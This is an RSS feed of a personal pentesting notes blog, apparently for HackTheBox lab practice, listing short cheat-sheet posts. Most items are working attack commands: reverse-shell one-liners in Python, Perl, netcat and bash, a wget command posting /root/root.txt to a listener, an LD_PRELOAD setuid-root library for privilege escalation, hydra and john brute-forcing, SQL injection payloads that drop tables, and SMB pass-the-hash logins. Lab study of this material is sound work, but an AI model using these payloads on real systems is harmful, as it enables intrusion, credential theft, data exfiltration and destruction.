<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title></title>
    <link>https://lnxpen.github.io/notes/</link>
    <description>Recent content on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 17 Dec 2018 21:17:20 +0100</lastBuildDate>
    
	<atom:link href="https://lnxpen.github.io/notes/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>bash commands</title>
      <link>https://lnxpen.github.io/notes/post/bash-commands/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/bash-commands/</guid>
      <description>#www server python -m SimpleHTTPServer 8000 
#on our kali machine we run:
nc -lvnp 7734 
#On the victim machine we run:
sudo wget &amp;ndash;post-file=/root/root.txt 10.10.14.4:7734

#curl download curl http://some.url &amp;ndash;output some.file 
#Sort
ls -ltr

#remove all before
cat lists |sed &amp;rsquo;s/^.*://&amp;rsquo; &amp;gt; md5</description>
    </item>
    
    <item>
      <title>bash scripts</title>
      <link>https://lnxpen.github.io/notes/post/bash-scrips/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/bash-scrips/</guid>
      <description>Ping
#!/bin/bash echo &amp;ldquo;first three octets of network to scan, end with a .&amp;rdquo; read network for host in {1..254}; do ping -c1 $network$host &amp;amp;&amp;gt;/dev/null; [ $? -eq 0 ] &amp;amp;&amp;amp; echo &amp;ldquo;$network$host is up&amp;rdquo; echo &amp;ldquo;done checking host: &amp;ldquo; $network$host done 
Portscan #!/bin/bash echo &amp;ldquo;host to portscan: &amp;ldquo; read host for port in {1..65000}; do (echo &amp;gt; /dev/tcp/$host/$port) &amp;amp;&amp;gt;/dev/null [ $? -eq 0 ] &amp;amp;&amp;amp; echo &amp;ldquo;$port open&amp;rdquo; done</description>
    </item>
    
    <item>
      <title>bash tools</title>
      <link>https://lnxpen.github.io/notes/post/bash-tools/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/bash-tools/</guid>
      <description></description>
    </item>
    
    <item>
      <title>ctf tools</title>
      <link>https://lnxpen.github.io/notes/post/ctf-tools/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/ctf-tools/</guid>
      <description>#pspy 32 &amp;amp; 64 bit
https://github.com/DominicBreuker/pspy</description>
    </item>
    
    <item>
      <title>ldap</title>
      <link>https://lnxpen.github.io/notes/post/ldap/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/ldap/</guid>
      <description>jxplorer</description>
    </item>
    
    <item>
      <title>links</title>
      <link>https://lnxpen.github.io/notes/post/links/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/links/</guid>
      <description>https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://github.com/pentestmonkey/unix-privesc-check
https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
https://www.rebootuser.com/?p=1623
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/ https://guif.re/linuxeop https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html http://pentestmonkey.net/category/cheat-sheet https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/ https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/ https://ahmedjouini.wordpress.com/ http://blog.kaiposecurity.nl/hackthebox-bastard/</description>
    </item>
    
    <item>
      <title>metasploit</title>
      <link>https://lnxpen.github.io/notes/post/metasploit/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/metasploit/</guid>
      <description>#ssh user enum search enumusers use options set USER_FILE run</description>
    </item>
    
    <item>
      <title>nmap</title>
      <link>https://lnxpen.github.io/notes/post/nmap/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/nmap/</guid>
      <description>nmap -sC -sV -oA nmap/hostname ip nmap -n -T4 -sS -sV -sC -oA nmap/hostname ip nmap -v -sS -p- -A -T4 -oA nmap/hostname ip nmap -v -sU -sS -p- -A -T4 -oA nmap/hostname ip nmap -p 80 &amp;ndash;script http-shellshock &amp;ndash;script-args uri=/cgi-bin/vulnscript.sh ip nmap -p 3306 &amp;ndash;script mysql-brute ip nmap -sV &amp;ndash;script=http-enum ip nmap -sV &amp;ndash;script=nfs-showmount ip nmap -sV &amp;ndash;script ssl-enum-ciphers -p 443 ip nmap -p445 &amp;ndash;script smb-vuln-ms17-010 ip nmap &amp;ndash;script smb-brute.</description>
    </item>
    
    <item>
      <title>openssl</title>
      <link>https://lnxpen.github.io/notes/post/openssl/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/openssl/</guid>
      <description>https://github.com/glv2/bruteforce-salted-openssl</description>
    </item>
    
    <item>
      <title>passwords</title>
      <link>https://lnxpen.github.io/notes/post/password/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/password/</guid>
      <description>#john john &amp;ndash;format=crypt &amp;ndash;wordlist=rockyou.txt &amp;ndash;session=two hashes.txt john &amp;ndash;format=NT &amp;ndash;rules -w=/usr/share/wordlists/rockyou.txt hashfile.txt
#hydra hydra -l admin docker.hackthebox.eu -s 44661 -P /usr/share/wordlists/rockyou.txt http-post-form &amp;lsquo;/index.php:password=^PASS^:F=Invalid password!&amp;rsquo; hydra -L users -P passwords 10.10.10.111 ssh hydra 10.10.10.153 http-post-form &amp;ldquo;/moodle/login/index.php:username=^USER^&amp;amp;password=^PASS^:F=Invalid login, please try again&amp;rdquo; -l giovanni -P list -t 10 -w 30 hash-identifier
hydra -l sammy -P rockyou.txt 10.10.10.76 -t 4 -s 22022 ssh</description>
    </item>
    
    <item>
      <title>privesc-libseclogin</title>
      <link>https://lnxpen.github.io/notes/post/privecs-libseclogin/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/privecs-libseclogin/</guid>
      <description>touch libseclogin.c  #include  #include  #include  #include  void seclogin() { setuid(0); setgid(0); execl(&amp;ldquo;/bin/bash&amp;rdquo;,&amp;ldquo;sh&amp;rdquo;,(char *)0); } int main(void) { seclogin(); } 
Compile the code with /usr/share/bash-completion/completions/gcc -shared -o libseclogin.so -fPIC libseclogin.c
cp libseclogin.so to /tmp
cd /etc/ld.so.conf.d ldconfig test.conf #(test.conf write /tmp) #it will give this output
/sbin/ldconfig.real: relative path `test.conf&amp;rsquo; used to build cache env LD_LIBRARY_PATH=/tmp LD_PRELOAD=/tmp/libseclogin.so strace echo &amp;lsquo;s3cur3l0g1n&amp;rsquo; | /usr/bin/myexec</description>
    </item>
    
    <item>
      <title>shell</title>
      <link>https://lnxpen.github.io/notes/post/shell/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/shell/</guid>
      <description>export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash
tar cf /dev/null testfile &amp;ndash;checkpoint=1 &amp;ndash;checkpoint-action=exec=/bin/bash
python -c &amp;lsquo;import pty; pty.spawn(&amp;ldquo;/bin/bash&amp;rdquo;)&amp;rsquo; python3 -c &amp;lsquo;import pty; pty.spawn(&amp;ldquo;/bin/bash&amp;rdquo;)&amp;rsquo; python -c import pty; pty.spawn(&amp;ldquo;/bin/bash&amp;rdquo;) python3 -c import pty; pty.spawn(&amp;lsquo;/bin/bash&amp;rsquo;)
echo os.system(&amp;lsquo;/bin/bash&amp;rsquo;) /bin/sh -i
echo &amp;ldquo;import pty; pty.spawn(&amp;lsquo;/bin/bash&amp;rsquo;)&amp;rdquo; &amp;gt; /tmp/asdf.py python /tmp/asdf.py</description>
    </item>
    
    <item>
      <title>shell esc</title>
      <link>https://lnxpen.github.io/notes/post/shell-esc/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/shell-esc/</guid>
      <description>export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash</description>
    </item>
    
    <item>
      <title>shell reverse</title>
      <link>https://lnxpen.github.io/notes/post/shell_reverse/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/shell_reverse/</guid>
      <description>python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.10.10.10&amp;rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;-i&amp;rdquo;]);&amp;rsquo;
perl -e &amp;lsquo;use Socket;$i=&amp;ldquo;10.10.10.10&amp;rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;ldquo;tcp&amp;rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDOUT,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDERR,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);exec(&amp;ldquo;/bin/sh -i&amp;rdquo;);};&amp;rsquo;
nc -e /bin/sh 10.0.0.1 1234
#reverse bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.100.113&amp;frasl;443 0&amp;gt;&amp;amp;1
#listen nc -lvp 443
nc -lp 1&amp;gt;/tmp/b</description>
    </item>
    
    <item>
      <title>shell search</title>
      <link>https://lnxpen.github.io/notes/post/shell_search/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/shell_search/</guid>
      <description>#capabilities getcap -r / 2/dev/null #grep recursive grep -RIlm1 &#34;bash&#34; /skrypty/ #sticky bit find / -perm -1000 -type d -exec la -la {} \; 2/dev/null #sgid chmod 2000 find / -perm -g=s -type f -exec ls -la {} \; 2/dev/null #SUID chmod 4000 find / -perm -u=s -type f -exec ls -la {} \; 2/dev/null  -sudo -l
-find php in /var/www/html with password to db
-find backup files</description>
    </item>
    
    <item>
      <title>sql</title>
      <link>https://lnxpen.github.io/notes/post/sql/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/sql/</guid>
      <description>#sql injection userName = Smith&amp;rsquo; or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1 userName =&amp;rsquo; or 1=1 &amp;ndash; userID = 1234567 or 1=1 UserName = Smith’;drop table users; truncate audit_log;&amp;ndash;</description>
    </item>
    
    <item>
      <title>ssh</title>
      <link>https://lnxpen.github.io/notes/post/ssh/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/ssh/</guid>
      <description>#putty puttygen my_private_key.ppk -O private-openssh -o keyfile
#ssh ssh -i keyfile root@10.10.10.107</description>
    </item>
    
    <item>
      <title>stego</title>
      <link>https://lnxpen.github.io/notes/post/stego/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/stego/</guid>
      <description>steghide export -sf file.jpg
./stegcracker ../../Hackthebox/Stego/beatles/BAND.JPG ../../app/rockyou.txt</description>
    </item>
    
    <item>
      <title>www dir scan</title>
      <link>https://lnxpen.github.io/notes/post/www-dir-scan/</link>
      <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/www-dir-scan/</guid>
      <description> dirb -h cewl seclists gobuster -u http://10.10.10.111:1880 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt gobuster -u http://10.10.10.111:9999/backup -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt #with -m -x it will be search txt,html gobuster -u http://10.10.10.111/dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -m -x  </description>
    </item>
    
    <item>
      <title>smb</title>
      <link>https://lnxpen.github.io/notes/post/smb/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/smb/</guid>
      <description>#user % hash smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B &amp;ndash;pw-nt-hash -W YPUFFY -L 10.10.10.107
#Allow to login to smb share smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B &amp;ndash;pw-nt-hash -W YPUFFY \\10.10.10.107\alice</description>
    </item>
    
    <item>
      <title>xss</title>
      <link>https://lnxpen.github.io/notes/post/xss/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://lnxpen.github.io/notes/post/xss/</guid>
      <description>xsser -u</description>
    </item>
    
  </channel>
</rss>